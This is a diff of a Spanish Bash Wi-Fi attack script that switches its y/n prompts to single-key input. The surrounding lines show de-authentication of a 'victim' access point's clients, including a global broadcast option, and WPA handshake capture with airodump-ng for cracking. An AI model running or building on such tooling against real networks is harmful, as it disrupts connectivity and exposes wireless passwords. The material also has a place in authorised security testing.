@@ -87,7 +87,7 @@ function interfaceModeMonitor(){
 }
 
 function attackDeauth (){
-	echo -en "\t${yellowColour}Conoces el [BSSID y CH] del AP victima(y/n): ${endColour}" && read opt
+	echo -en "\t${yellowColour}Conoces el [BSSID y CH] del AP victima(y/n): ${endColour}" && read -rsn1 opt
 
 	if [ "$opt" == "n" ] || [ "$opt" == "N" ]; then
 		xterm -hold -e "airodump-ng ${networkCard}mon" 2> /dev/null &
@@ -104,7 +104,7 @@ function attackDeauth (){
 	xterm -hold -e "airodump-ng --bssid $BSSID --channel $CH --write /dev/null ${networkCard}mon" 2>/dev/null &
         xtermAirodump_AP_PID=$!; sleep 1
 
-	echo -en "\t${yellowColour}De-autenticación GLOBAL(y/n): ${endColour}" && read mode
+	echo -en "\t${yellowColour}De-autenticación GLOBAL(y/n): ${endColour}" && read -rsn1 mode
 
 	if [ "$mode" == "y" ] || [ "$mode" == "Y" ]; then
 		ST='FF:FF:FF:FF:FF:FF'
@@ -112,7 +112,7 @@ function attackDeauth (){
 		echo -en "\t${yellowColour}STATYON: ${endColour}" && read ST
 	fi
 
-	echo -en "\t${yellowColour}Mas opciones(y/n): ${endColour}" && read opt
+	echo -en "\t${yellowColour}Mas opciones(y/n): ${endColour}" && read -rsn1 opt
 
 	if [ "$opt" == "y" ] || [ "$opt" == "Y" ]; then
 		echo -en "\t${yellowColour}Duracion (s): ${endColour}" && read numS; sleep 0.5
@@ -162,7 +162,7 @@ function attackHandshake(){
 	xterm -hold -e "airodump-ng --bssid $BSSID --channel $CH --write Captura ${networkCard}mon" 2>/dev/null &
 	xtermAirodump_AP_PID=$!; sleep 1
 	
-	echo -en "\t${yellowColour}De-autenticación GLOBAL(y/n): ${endColour}" && read mode
+	echo -en "\t${yellowColour}De-autenticación GLOBAL(y/n): ${endColour}" && read -rsn1 mode
 
 	if [ "$mode" == "y" ] || [ "$mode" == "Y" ]; then	
 		ST='FF:FF:FF:FF:FF:FF'
@@ -189,7 +189,7 @@ function attackHandshake(){
 
 	echo -e "\t${readColour}::${endColour} ${grayColour}Crack Handshake${scanTimeout}(s)${endColour}"
 
-	sleep 1; echo -en "\t${yellowColour}Eliminar captura(y/n): ${endColour}" && read capOPT
+	sleep 1; echo -en "\t${yellowColour}Eliminar captura(y/n): ${endColour}" && read -rsn1 capOPT
 	sleep 1 
 
 	if [ "$capOPT" == "y" ] || [ "$capOPT" == "Y" ]; then
